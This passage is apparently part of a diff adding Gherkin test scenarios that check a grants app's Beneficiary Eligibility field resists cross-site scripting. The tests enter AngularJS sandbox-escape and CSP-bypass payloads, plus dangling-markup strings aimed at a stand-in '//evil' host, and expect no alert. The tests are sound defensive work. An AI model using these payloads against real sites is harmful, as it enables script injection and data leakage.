+      | Value                                                                   | Field                          |
+      | {y:''.constructor.prototype}.y.charAt=[].join;[1]\|orderBy:'x=alert(1)' | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307141 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                 | Field                          |
+      | constructor.constructor('alert(1)')() | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307142 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                   | Field                          |
+      | toString().constructor.prototype.charAt=[].join; [1,2]\|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307145 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                        | Field                          |
+      | <input autofocus ng-focus="$event.composedPath()\|orderBy:'[].constructor.from([1],alert)'"> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307156 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                               | Field                          |
+      | <input id=x ng-focus=$event.composedPath()\|orderBy:'(z=alert)(1)'> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307158 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                        | Field                          |
+      | <input autofocus ng-focus="$event.composedPath()\|orderBy:'[].constructor.from([1],alert)'"> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307163 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                                                                          | Field                          |
+      | <div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307167 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                          | Field                          |
+      | <input ng-cut=$event.composedPath() \| orderBy:'(y=alert)(1)'> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307174 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                                                                                                                      | Field                          |
+      | <body background="//evil? \n <table background="//evil? \n <table><thead background="//evil? \n <table><tbody background="//evil? \n <table><tfoot background="//evil? \n <table><td background="//evil? \n <table><th background="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307181 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                              | Field                          |
+      | <link rel=stylesheet href="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307187 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                        | Field                          |
+      | <link rel=icon href="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307190 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                | Field                          |
+      | <meta http-equiv="refresh" content="0; http://evil?? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307192 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                | Field                          |
+      | <img src="//evil?<image src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307198 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                              | Field                          |
+      | <video><track default src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307200 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                       | Field                          |
+      | <video><source src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307201 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                       | Field                          |
+      | <audio><source src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307203 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                          | Field                          |
+      | <input type=image src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307204 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
